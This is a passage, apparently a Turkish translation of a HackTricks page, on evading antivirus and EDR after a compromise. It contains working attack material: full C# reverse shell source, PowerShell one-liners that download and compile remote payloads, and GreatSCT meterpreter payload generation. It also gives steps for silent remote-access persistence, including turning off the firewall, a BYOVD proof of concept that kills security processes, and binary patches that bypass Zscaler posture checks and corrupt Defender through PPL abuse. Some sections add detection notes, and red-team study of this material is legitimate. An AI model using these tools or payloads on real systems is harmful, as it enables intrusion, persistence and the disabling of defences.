Bu yöntem, yeni bir **sacrificial process** oluşturmayı, post-exploitation kötü amaçlı kodunuzu o yeni sürece inject etmeyi, kötü amaçlı kodu çalıştırmayı ve iş bitince yeni süreci sonlandırmayı içerir. Bunun hem avantajları hem de dezavantajları vardır. Fork and run yönteminin avantajı, yürütmenin Beacon implant sürecimizin **dışında** gerçekleşmesidir. Bu, post-exploitation eylemlerimizden biri ters gider veya yakalanırsa implantımızın hayatta kalma olasılığının **çok daha yüksek** olduğu anlamına gelir. Dezavantajı ise Behavioural Detections tarafından yakalanma **olasılığınızın daha yüksek** olmasıdır.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Bu, post-exploitation kötü amaçlı kodu **kendi sürecine** inject etmekle ilgilidir. Bu şekilde yeni bir süreç oluşturmak ve AV tarafından taranmasını sağlamak zorunda kalmazsınız, ancak dezavantajı payload'unuzun yürütülmesinde bir şeyler ters giderse süreç çökebileceği için **beacon'ınızı kaybetme** olasılığının **çok daha yüksek** olmasıdır.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly yükleme hakkında daha fazla okumak isterseniz, şu makaleye bakın [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) ve onların InlineExecute-Assembly BOF'u ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

C# Assembly'lerini ayrıca **PowerShell'den** de yükleyebilirsiniz; bakınız [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) ve [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

As proposed in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), ele geçirilen makineye Attacker Controlled SMB share üzerinde kurulu interpreter ortamına erişim vererek diğer dillerle kötü amaçlı kod çalıştırmak mümkündür.

SMB paylaşımdaki Interpreter Binaries ve ortama erişime izin vererek, ele geçirilen makinenin belleği içinde bu dillerde **herhangi bir kodu çalıştırabilirsiniz**.

The repo indicates: Defender still scans the scripts but by utilising Go, Java, PHP etc we have **daha fazla esneklik ile statik imzaları atlatma**. Bu dillerde rastgele un-obfuscated reverse shell scriptleri ile yapılan testler başarılı oldu.

## TokenStomping

Token stomping, bir saldırganın erişim token'ını veya bir güvenlik ürünü (ör. EDR ya da AV) üzerinde **yetkileri manipüle etmesine** olanak tanıyan bir tekniktir; böylece süreç sonlanmaz ama kötü amaçlı aktiviteleri kontrol etme izinlerine sahip olmaz.

To prevent this Windows could **prevent external processes** from getting handles over the tokens of security processes.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

As described in [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), bir hedefin PC'sine Chrome Remote Desktop'ı deploy etmek ve ardından ele geçirip persistence sağlamak kolaydır:
1. https://remotedesktop.google.com/ adresinden indirin, "Set up via SSH"e tıklayın ve Windows için MSI dosyasını indirmek için MSI dosyasına tıklayın.
2. Kurulumu hedefte sessizce çalıştırın (admin gerekli): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop sayfasına geri dönün ve next'e tıklayın. Kurulum sihirbazı sizden yetki isteyecek; devam etmek için Authorize düğmesine tıklayın.
4. Verilen parametreyi bazı ayarlamalarla çalıştırın: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Not: pin parametresi GUI'yi kullanmadan pin belirlemenize olanak tanır.)

## Advanced Evasion

Evasion çok karmaşık bir konudur; bazen tek bir sistemde birçok farklı telemetri kaynağını dikkate almanız gerekir, bu yüzden olgun ortamlarda tamamen tespit edilmeden kalmak neredeyse imkansızdır.

Her karşılaştığınız ortamın kendi güçlü ve zayıf yönleri olacaktır.

Daha ileri seviye Evasion tekniklerine giriş yapmak için [@ATTL4S](https://twitter.com/DaniLJ94)'ın bu konuşmasını izlemenizi şiddetle tavsiye ederim.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Bu aynı zamanda [@mariuszbit](https://twitter.com/mariuszbit)'in Evasion in Depth hakkında başka harika bir konuşmasıdır.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Eski Teknikler**

### **Defender'ın hangi parçaları kötü amaçlı bulduğunu kontrol etme**

ThreatCheck'ı kullanabilirsiniz ([**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)), bu araç **ikili dosyanın parçalarını kaldıracak** ve **Defender'ın hangi kısmı kötü amaçlı bulduğunu** tespit edene kadar bunu yapıp sonucu size bölecektir.\
Aynı işi yapan başka bir araç ise [**avred**](https://github.com/dobin/avred) olup açık web üzerinden hizmeti [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) adresinde sunmaktadır.

### **Telnet Server**

Windows 10'a kadar, tüm Windows sürümleri yönetici olarak şunu yaparak kurabileceğiniz bir **Telnet server** ile geliyordu:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Sistem başlatıldığında **başlatılmasını sağlayın** ve şimdi **çalıştırın**:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet portunu değiştir** (stealth) ve firewall'u devre dışı bırak:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

İndirin: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (bin indirmelerini seçin, setup'ı değil)

**ON THE HOST**: _**winvnc.exe**_ çalıştırın ve sunucuyu yapılandırın:

- Enable the option _Disable TrayIcon_
- Set a password in _VNC Password_
- Set a password in _View-Only Password_

Daha sonra, ikili _**winvnc.exe**_ ve **newly** oluşturulan dosya _**UltraVNC.ini**_ dosyasını **victim** içine taşıyın

#### **Reverse connection**

**attacker** kendi **host**'unda `vncviewer.exe -listen 5900` ikilisini **execute inside** etmelidir; böylece reverse **VNC connection** yakalamaya **prepared** olur. Ardından, **victim** içinde: winvnc daemon'unu `winvnc.exe -run` ile başlatın ve `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` çalıştırın

**WARNING:** Gizliliği korumak için bazı şeyleri yapmamalısınız

- `winvnc` zaten çalışıyorsa başlatmayın veya [popup](https://i.imgur.com/1SROTTl.png) tetiklenir. Çalışıp çalışmadığını `tasklist | findstr winvnc` ile kontrol edin
- `UltraVNC.ini` aynı dizinde olmadan `winvnc`'i başlatmayın veya [the config window](https://i.imgur.com/rfMQWcf.png) açılır
- `winvnc -h` ile yardım çalıştırmayın, aksi halde [popup](https://i.imgur.com/oc18wcu.png) tetiklenir

### GreatSCT

İndirin: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT'in İçinde:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Şimdi `msfconsole -r file.rc` ile **lister'ı başlatın** ve **xml payload**'ı **çalıştırın**:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Mevcut defender işlemi çok hızlı sonlandıracaktır.**

### Kendi reverse shell'imizi derlemek

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### İlk C# Revershell

Şu komutla derleyin:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Şununla kullanın:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using derleyicisi
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Otomatik indirme ve yürütme:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators listesi: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### injector oluşturmak için python örneği:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Diğer araçlar
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Daha Fazla

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Çekirdek Alanından AV/EDR'i Sonlandırma

Storm-2603, fidye yazılımı bırakmadan önce uç nokta korumalarını devre dışı bırakmak için **Antivirus Terminator** olarak bilinen küçük bir konsol aracını kullandı. Araç kendi **vulnerable ancak *signed* driver'ını** getiriyor ve Protected-Process-Light (PPL) AV servislerinin bile engelleyemeyeceği ayrıcalıklı çekirdek işlemlerini gerçekleştirmek için bunu suistimal ediyor.

Ana çıkarımlar
1. **İmzalı sürücü**: Diske bırakılan dosya `ServiceMouse.sys` olarak kaydediliyor, ancak ikili dosya Antiy Labs’ın “System In-Depth Analysis Toolkit”ten meşru şekilde imzalanmış `AToolsKrnl64.sys` sürücüsü. Sürücü geçerli bir Microsoft imzasına sahip olduğundan Driver-Signature-Enforcement (DSE) etkin olsa bile yükleniyor.
2. **Servis kurulumu**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
İlk satır sürücüyü bir **kernel servisi** olarak kaydeder, ikinci satır ise başlatır; böylece `\\.\ServiceMouse` user land'den erişilebilir hale gelir.
3. **Sürücünün ifşa ettiği IOCTL'ler**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | PID ile rastgele bir süreci sonlandır (Defender/EDR servislerini öldürmek için kullanıldı) |
| `0x990000D0` | Diskteki rastgele bir dosyayı sil |
| `0x990001D0` | Sürücüyü boşalt ve servisi kaldır |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Neden işe yarıyor**: BYOVD kullanıcı modu korumalarını tamamen atlıyor; çekirdekte çalışan kod *protected* süreçleri açabilir, sonlandırabilir veya PPL/PP, ELAM veya diğer sertleştirme özelliklerine bakılmaksızın çekirdek nesneleriyle müdahale edebilir.

Tespit / Hafifletme
•  Microsoft’un vulnerable-driver engelleme listesini (`HVCI`, `Smart App Control`) etkinleştirin, böylece Windows `AToolsKrnl64.sys`'nin yüklenmesini reddetsin.  
•  Yeni *kernel* servislerinin oluşturulmasını izle ve bir sürücü world-writable bir dizinden yüklendiğinde veya allow-list'te değilse uyarı ver.  
•  Özelleştirilmiş device object'lere yapılan kullanıcı modu handle'larını ve ardından gelen şüpheli `DeviceIoControl` çağrılarını izle.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’ın **Client Connector**'ı device-posture kurallarını yerel olarak uygular ve sonuçları diğer bileşenlere iletmek için Windows RPC'ye güveniyor. İki zayıf tasarım tercihi tam bir bypass'ı mümkün kılıyor:

1. Posture değerlendirmesi **tamamen client-side** gerçekleşiyor (sunucuya bir boolean gönderiliyor).  
2. Dahili RPC endpoint'leri yalnızca bağlanan yürütülebilir dosyanın **Zscaler tarafından imzalı** olduğunu doğruluyor (`WinVerifyTrust` aracılığıyla).

Diskteki dört imzalı ikiliyi yama yaparak her iki mekanizma da etkisiz hale getirilebilir:

| Binary | Orijinal mantık (yamanan) | Sonuç |
|--------|---------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Her zaman `1` döner, böylece her kontrol uyumlu sayılır |
| `ZSAService.exe` | `WinVerifyTrust`'a dolaylı çağrı | NOP-ed ⇒ herhangi bir (imzasız bile) süreç RPC pipe'larına bind edebilir |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` ile değiştirildi |
| `ZSATunnel.exe` | Tünel üzerindeki bütünlük kontrolleri | Kısa devre yapıldı |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
After replacing the original files and restarting the service stack:

* **Tüm** posture kontrolleri **yeşil/uyumlu** gösterir.
* İmzalanmamış veya değiştirilmiş ikili dosyalar named-pipe RPC uç noktalarını açabilir (ör. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* İhlal edilmiş konak, Zscaler politikalarıyla tanımlanan iç ağa sınırsız erişim elde eder.

Bu vaka çalışması, salt istemci taraflı güven kararlarının ve basit imza kontrollerinin birkaç bayt yaması ile nasıl alt edilebileceğini gösterir.

## Protected Process Light (PPL) Kullanarak LOLBINs ile AV/EDR'ye Müdahale

Protected Process Light (PPL), yalnızca eşit veya daha yüksek korumaya sahip protected process'lerin birbirine müdahale edebilmesini sağlayan bir signer/seviye hiyerarşisi uygular. Saldırgan amaçlı olarak, eğer meşru şekilde PPL-etkin bir binary başlatabiliyor ve argümanlarını kontrol edebiliyorsanız, zararsız bir işlevselliği (ör. logging) AV/EDR tarafından kullanılan korumalı dizinlere karşı kısıtlı, PPL-backed bir write primitive'e dönüştürebilirsiniz.

Bir işlemin PPL olarak çalışmasını sağlayanlar
- Hedef EXE (ve yüklü DLL'ler) PPL-capable EKU ile imzalanmış olmalıdır.
- İşlem, CreateProcess ile şu flag'ler kullanılarak oluşturulmalıdır: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Binary'nin imzalayanına uyan uyumlu bir protection level talep edilmelidir (ör. anti-malware imzalayanları için `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`, Windows imzalayanları için `PROTECTION_LEVEL_WINDOWS`). Yanlış seviyeler oluşturma sırasında başarısız olur.

Ayrıca PP/PPL ve LSASS korumasına daha geniş bir giriş için bakın:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Başlatıcı araçlar
- Open-source helper: CreateProcessAsPPL (koruma seviyesini seçer ve argümanları hedef EXE'ye iletir):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Kullanım biçimi:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- İmzalı sistem ikili dosyası `C:\Windows\System32\ClipUp.exe` self-spawns yapar ve çağıranın belirttiği bir yola log dosyası yazmak için bir parametre kabul eder.
- PPL process olarak başlatıldığında, dosya yazma PPL backing ile gerçekleşir.
- ClipUp boşluk içeren yolları parse edemez; normalde korunmuş konumlara işaret etmek için 8.3 kısa yolları kullanın.

8.3 short path helpers
- Kısa adları listeleyin: her üst dizinde `dir /x`.
- cmd'de kısa yolu türetin: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) PPL-capable LOLBIN (ClipUp) 'ı `CREATE_PROTECTED_PROCESS` kullanarak bir launcher ile başlatın (ör. CreateProcessAsPPL).
2) ClipUp log-path argümanını, korumalı bir AV dizininde (ör. Defender Platform) bir dosya oluşturmayı zorlamak için geçirin. Gerekirse 8.3 kısa adları kullanın.
3) Hedef binary normalde AV tarafından çalışırken açık/locked ise (ör. MsMpEng.exe), yazmayı AV başlamadan önce önyüklemede planlamak için daha erken güvenilir şekilde çalışan bir auto-start service kurun. Boot sıralamasını Process Monitor (boot logging) ile doğrulayın.
4) Yeniden başlatmada PPL-backed yazma AV ikililerini kilitlemeden önce gerçekleşir, hedef dosyayı bozarak başlatmayı engeller.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- ClipUp'un yazdığı içeriğin yerleştirme dışında kontrolü sizde değildir; bu primitive hassas içerik enjeksiyonundan ziyade bozmaya uygundur.
- Bir hizmeti yüklemek/başlatmak ve yeniden başlatma penceresi için local admin/SYSTEM gerektirir.
- Zamanlama kritik: hedef açık olmamalı; önyükleme zamanı yürütme dosya kilitlerinden kaçınır.

Detections
- Önyükleme sırasında, alışılmadık argümanlarla oluşturulan `ClipUp.exe` süreçleri; özellikle standart dışı başlatıcılar tarafından parent edilmiş olanlar.
- Şüpheli ikili dosyaları otomatik başlatacak şekilde yapılandırılan yeni servisler ve Defender/AV'den önce sürekli başlayanlar. Defender başlatma hatalarından önce servis oluşturma/değişikliğini araştırın.
- Defender ikili dosyaları/Platform dizinleri üzerinde dosya bütünlüğü izleme; protected-process bayraklarına sahip süreçler tarafından beklenmeyen dosya oluşturma/değişiklikleri.
- ETW/EDR telemetri: `CREATE_PROTECTED_PROCESS` ile oluşturulan süreçleri ve non-AV ikili dosyalar tarafından anormal PPL seviye kullanımlarını arayın.

Mitigations
- WDAC/Code Integrity: hangi imzalı ikili dosyaların PPL olarak ve hangi parent'lar altında çalışabileceğini kısıtlayın; meşru bağlamların dışındaki ClipUp çağrılarını engelleyin.
- Servis hijyeni: otomatik başlatılan servislerin oluşturulmasını/değiştirilmesini kısıtlayın ve başlatma sırası manipülasyonunu izleyin.
- Defender tamper protection ve early-launch korumalarının etkin olduğundan emin olun; ikili dosya bozulmasını gösteren başlangıç hatalarını araştırın.
- Güvenlik araçlarını barındıran hacimlerde ortamınızla uyumluysa 8.3 kısa ad üretimini devre dışı bırakmayı düşünün (iyice test edin).

References for PPL and tooling
- Microsoft Protected Processes genel bakışı: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU referansı: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (sıralama doğrulaması): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Teknik yazısı (ClipUp + PPL + başlatma sırası tahrifi): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## References

- [Unit42 – DarkCloud Stealer için Yeni Enfeksiyon Zinciri ve ConfuserEx Tabanlı Obfuskasyon](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Zero trust'ınıza güvenmeli misiniz? Zscaler posture kontrollerini atlatmak](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – ToolShell'den Önce: Storm-2603’ün Önceki Ransomware Operasyonlarını Keşfetmek](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Forwarded Exports'i Kötüye Kullanma](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Envanteri (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Bilinen DLL'ler](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Korumalı Süreçler](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU referansı (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Protected Process Light (PPL) desteğiyle EDR'lere Karşı Koyma](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

{{#include ../banners/hacktricks-training.md}}
